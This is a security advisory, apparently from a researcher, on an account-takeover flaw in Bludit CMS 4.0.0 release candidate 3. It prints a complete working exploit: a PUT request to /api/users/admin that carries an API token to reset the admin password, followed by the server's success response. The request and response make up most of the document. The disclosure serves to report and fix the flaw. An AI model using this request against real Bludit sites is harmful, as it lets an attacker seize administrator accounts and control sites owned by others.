## [Bludit-v4.0.0-Release-candidate-3 Account takeover vulnerability](https://github.com/bludit/bludit/releases/tag/4.0.0-rc-3)

## Description:
The already authenticated attacker can send a normal request to change his password and then he can use the 
same JSON `object` and the vulnerable `API token KEY` in the same request to change the admin account password.
Then he can access the admin account and he can do very malicious stuff.

STATUS: HIGH Vulnerability

[+]Exploit:
```HTTP
PUT /api/users/admin HTTP/1.1
Host: 127.0.0.1:8000
Content-Length: 138
sec-ch-ua: "Not:A-Brand";v="99", "Chromium";v="112"
sec-ch-ua-platform: "Windows"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
content-type: application/json
Accept: */*
Origin: http://127.0.0.1:8000
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8000/admin/edit-user/pwned
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: BLUDIT-KEY=tfq2jhusdpjheojbto5b4a4ora
Connection: close

{"token":"1dc085f18ffe819d08db99cfe2192890","authentication":"7ea605da54692d2bfcd9c99c40243993","username":"pwned","password":"password1"}

```

[+]Response:
```HTTP
HTTP/1.1 200 OK
Host: 127.0.0.1:8000
Date: Sat, 22 Apr 2023 06:47:46 GMT
Connection: close
X-Powered-By: PHP/8.2.0
Access-Control-Allow-Origin: *
Content-Type: application/json

{"status":"0","message":"User edited.","data":{"key":"admin"}}
```


## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/bludit/2023/Bludit-v4.0.0-Release-candidate-3)

## Proof and Exploit:
[href](https://streamable.com/v83ppb)

## Time spend:
00:27:00
